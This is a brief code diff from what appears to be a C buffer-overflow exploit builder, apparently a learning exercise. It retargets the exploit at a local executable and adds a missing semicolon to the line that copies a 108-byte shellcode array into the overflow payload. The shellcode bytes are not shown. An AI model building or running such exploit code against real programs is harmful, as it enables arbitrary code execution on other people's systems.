@@ -8,7 +8,7 @@
 
 //path to defect application
 
-#define BAD_APP "buffer.exe\"
+#define BAD_APP "C:\\Users\\tymot\\Desktop\\msc.exe\""
 
 //shellcode in heksdecymal form  without null values
 unsigned char shellcode[108]=
@@ -62,7 +62,7 @@ int main(void)
 	i+=8;
 	
 	//add shellcode
-	memcpy((void*)&exploit_data[i],(void*)&shellcode,sizeof(shellcode))
+	memcpy((void*)&exploit_data[i],(void*)&shellcode,sizeof(shellcode));
 	i+=sizeof(shellcode);
 	
 	exploit_data[i]='"';
